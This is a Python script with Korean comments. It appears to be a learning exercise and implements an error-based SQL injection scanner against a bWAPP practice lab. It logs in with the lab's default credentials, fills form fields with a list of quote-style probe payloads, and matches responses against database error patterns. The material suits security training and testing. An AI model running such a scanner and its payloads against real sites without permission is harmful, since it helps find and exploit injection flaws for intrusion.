# Error Based SQL Injection Scanner
# SQL 에러 구문을 확인하여 취약점을 확인
import re
import requests
from urllib.parse import urljoin, urlencode
from bs4 import BeautifulSoup
from pprint import pprint
from colorama import init, Fore

init(autoreset=True)

base_url = "https://bwapp.hakhub.net"
target_url = f"{base_url}/sqli_1.php" # GET: sqli_1.php, POST: sqli_6.php
login_url = f"{base_url}/login.php"

# sqli_payloads : 공격 인자값 튜플(이를 대입해 db오류를 유발)
sqli_payloads = (
    "'",
    "')",
    "';",
    '"',
    '")',
    '";',
    "`",
    "`)",
    "`;",
    "\\",
    "%27",
    "%%2727",
    "%25%27",
    "%60",
    "%5C",
)

def get_login_session():
    # 로그인 세션 반환
    s = requests.Session()
    data = {
        "login": "bee",
        "password": "bug",
        "security_level": "0",
        "form": "submit",
    }
    s.post(login_url, data=data)
    return s


def get_forms(session, url):
    # bs4로 form 태그를 모두 반환
    page_content = session.get(url).content
    soup = BeautifulSoup(page_content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    details = {}
    # form의 이동할 action url
    action = form.attrs.get("action")
    # form method(GET, POST, etc..)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

# SQL Injection 수행 함수
def sql_injection(session, form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    joined_url = ""
    inputs = form_details["inputs"]

    # 공격 인자값 가져오기
    data = {}
    for input in inputs:
        # replace all text and search values with 'value'
        if input["type"]=="text" or input["type"]=="search":
            input["value"]=value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            # if input name and input_value are not None,
            # then add them to the data of form submission
            data[input_name] = input_value
    
    try:
        # SQL Injection 오류를 탐지하는 부분으로
        # 공격 인자값을 포함해 페이지를 호출한 후
        #   check_sql() 함수를 통해 에러값을 탐지함.
        if form_details["method"] == "get":
            joined_url = target_url + "?" + urlencode(data)
            response = session.get(joined_url, params=data).content.decode()
            is_vulnerable, db_type = check_sql(response)
            if is_vulnerable:
                print(Fore.RED+"[+] SQL Injection vulnerability detected")
                print(Fore.BLUE+"[+] DB Type: " + db_type)
                print(Fore.BLUE + "[+] URL: " + joined_url)
                print()

        elif form_details["method"] == "post":
            response = session.post(target_url, data=data).content.decode()
            is_vulnerable, db_type = check_sql(response)
            if is_vulnerable:
                print(Fore.RED+"[+] SQL Injection vulnerability detected")
                print(Fore.BLUE+"[+] DB Type: " + db_type)
                print(Fore.BLUE + "[+] URL: " + joined_url)
                pprint(data)
                print()
    
    except Exception as e:
        print("Exception Error: ", e)

# HTML 소스로부터 SQL 오류를 탐지하며 DB 종류를 에러 메시지로 비교해 찾음
def check_sql(html):
    sql_errors = {
        "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQL Query fail.*"),
        "MariaDB": (r"SQL syntax.*MariaDB server",),
        "PostgreSQL": (
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"Warning.*PostgreSQL",
        ),   
    }
    for db, errors in sql_errors.items():
        for error in errors:
            if re.compile(error).search(html):
                return True, db
    
    return False, None




if __name__ == '__main__':
    session = get_login_session()
    forms = get_forms(session, target_url)
    for form in forms:
        form_details = get_form_details(form)
        if len(form_details["inputs"]) > 0:
            print(Fore.RED+"[[Form Found]]")
            print(form_details)
            for payload in sqli_payloads:
                sql_injection(session, form_details, base_url, payload)

